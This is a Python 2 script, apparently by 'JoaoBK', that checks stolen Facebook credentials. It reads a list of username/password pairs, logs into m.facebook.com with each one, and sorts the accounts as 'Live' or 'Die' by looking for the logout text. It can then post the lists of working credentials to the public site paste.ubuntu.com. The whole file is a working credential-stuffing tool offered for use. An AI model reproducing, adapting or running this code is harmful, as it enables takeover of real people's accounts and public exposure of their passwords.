#!/usr/bin/python
#coding: utf-8

import mechanize
import os
from sys import exit
from time import sleep

try:

	def banner():
		os.system("cls||clear")
		print('''    _                   _     _    
   (_) ___   __ _  ___ | |__ | | __
   | |/ _ \ / _` |/ _ \| '_ \| |/ /
   | | (_) | (_| | (_) | |_) |   < 
  _/ |\___/ \__,_|\___/|_.__/|_|\_\
 |__/

### python -m pip install mechanize
### Coded by JoaoBK - Python 2.7                         
	''')

	option = raw_input("\n[!] Do you want to install mechanize? [y/n] : ")
	if option == "y":
		print("\n[!] Please wait 3 seconds...\n")
		os.system("python -m pip install mechanize||python2 -m pip install mechanize||python3 -m pip install mechanize")
		sleep(3)
	banner()
	accountsfile = raw_input("[+] Using file: ")
	separator = raw_input("[+] Separator: ")

	arquivo = open(accountsfile, 'r').readlines()

	def main():
		print("\n[!] Opening DB...")
		print("\n[!] Start checking...")
		print("\n[!] Generating facebook-output.txt...\n")
		for line in arquivo:
			global username, password
			username, password = (line.strip()).split(str(separator))
			browser = mechanize.Browser()
			browser.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
			browser.set_handle_robots(False)
			browser.open("https://m.facebook.com/login.php?login_attempt=1")
			browser.select_form(nr = 0)
			browser.form["email"] = username
			browser.form["pass"] = password
			browser.submit()
			response = browser.open("https://m.facebook.com/login.php?login_attempt=1")
			fileobj = open("facebook-output.txt","wb")
			fileobj.write(response.read())
			fileobj.close()
			check()
		option = raw_input("\n[!] Send result to paste.ubuntu.com? [y/n] : ")
		if option == "y":
			send_to_paste()
		else:
			print("\n[-] Exiting...")
			exit()
		exit()

	global str_live, str_die
	str_live = ""
	str_die = ""

	global list_live, list_die
	list_live = []
	list_die = []

	def check():
	    data_file = open('facebook-output.txt', 'r').read()
	    msg_post = "Sair ("
	    msg_live = "[+] Live Account | %s | %s" %(username, password)
	    msg_die = "[-] Die Account | %s |  %s" %(username, password)
	    if msg_post in data_file:
	        print(msg_live)
	        list_live.append("[+] Lived > " + username + " | " + password)
	    else:
	    	print(msg_die)
	    	list_die.append("[-] Died > " + username + " | " + password)

	def send_to_paste():
		str_live = '\n'.join(list_live)
		str_die = '\n'.join(list_die)
		print("\nSending to paste.ubuntu.com...")
		browser = mechanize.Browser()
		browser.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
		browser.set_handle_robots(False)
		browser.set_handle_equiv(False) 
		browser.open("http://paste.ubuntu.com/")
		browser.select_form(nr = 0)
		browser.form["poster"] = "Testador"
		browser.form["content"] = ("""

++++++++++++++++++++++++++++++++++++++++

CONTAS LIVE: #CHECKER BY JOAOBK

++++++++++++++++++++++++++++++++++++++++
	\n""" + str_live + """\n
++++++++++++++++++++++++++++++++++++++++

CONTAS DIE: #CHECKER BY JOAOBK

++++++++++++++++++++++++++++++++++++++++
	\n""" + str_die)
		sub = browser.submit()
		print("\n[+] OUTPUT URL: " + sub.geturl())

	if __name__ == "__main__":
		main()
except ValueError:
	print("[x] Error!\n[!] Check your python version!\n[x] For use this script you need Python 2.7!")
	exit()